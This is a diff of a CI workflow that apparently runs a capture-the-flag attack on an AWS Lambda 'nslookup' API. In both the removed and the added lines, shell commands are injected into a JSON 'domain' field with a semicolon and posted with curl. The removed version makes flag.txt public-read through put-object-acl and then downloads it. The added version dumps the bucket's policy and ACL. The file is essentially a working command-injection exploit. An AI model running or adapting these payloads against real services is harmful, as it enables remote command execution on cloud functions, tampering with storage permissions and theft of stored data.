@@ -26,22 +26,18 @@ jobs:
           URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
           BUCKET="codec4f26c862a321ef5"
           
-          echo "=== 1. FORCING LAMBDA TO GRANT READ PERMISSIONS ==="
-          # This command injection tells the Lambda to use its AWS CLI to make flag.txt publicly readable via ACL
-          PAYLOAD="{\"domain\": \"127.0.0.1; aws s3api put-object-acl --bucket ${BUCKET} --key flag.txt --acl public-read\"}"
+          echo "=== 1. CHECKING BUCKET POLICY ==="
+          # This command injection asks the Lambda to print the bucket policy
+          PAYLOAD="{\"domain\": \"127.0.0.1; aws s3api get-bucket-policy --bucket ${BUCKET}\"}"
           
           curl -s -X POST "$URL" \
             -H "Content-Type: application/json" \
             -d "$PAYLOAD"
           
           echo ""
-          echo "=== 2. WAITING 2 SECONDS FOR PERMISSIONS TO PROPAGATE ==="
-          sleep 2
+          echo "=== 2. CHECKING BUCKET ACL ==="
+          PAYLOAD_ACL="{\"domain\": \"127.0.0.1; aws s3api get-bucket-acl --bucket ${BUCKET}\"}"
           
-          echo "=== 3. DOWNLOADING FLAG DIRECTLY VIA HTTPS ==="
-          # Since it's now public-read, your runner can download it straight over clean HTTPS with zero IAM blocks!
-          curl -s "https://${BUCKET}.s3.${REGION}.amazonaws.com/flag.txt" -o direct_flag.txt
-          
-          echo ""
-          echo "=== 4. BEHOLD YOUR HARD-EARNED VICTORY ==="
-          cat direct_flag.txt
+          curl -s -X POST "$URL" \
+            -H "Content-Type: application/json" \
+            -d "$PAYLOAD_ACL"
